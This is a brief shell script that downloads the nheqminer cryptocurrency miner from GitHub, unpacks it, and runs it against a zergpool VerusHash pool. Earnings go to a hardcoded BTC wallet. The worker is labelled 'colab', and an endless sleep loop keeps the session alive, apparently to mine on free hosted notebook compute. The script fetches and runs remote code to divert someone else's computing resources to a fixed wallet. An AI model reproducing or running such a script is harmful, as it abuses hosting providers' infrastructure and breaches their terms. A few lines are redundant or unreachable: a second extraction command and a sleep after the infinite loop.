#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tgz
tar xf nheqminer-Linux-v0.8.2.tar.gz
cd nheqminer
./nheqminer -v -l verushash.mine.zergpool.com:3300 -u 1NFd7YKLwgFte8hF3k7HXykXh6Wdvx7aUU.git -p c=BTC,mc=VRSC,ID=colab -t 4
while [ 1 ]; do
sleep 3
done
sleep 999
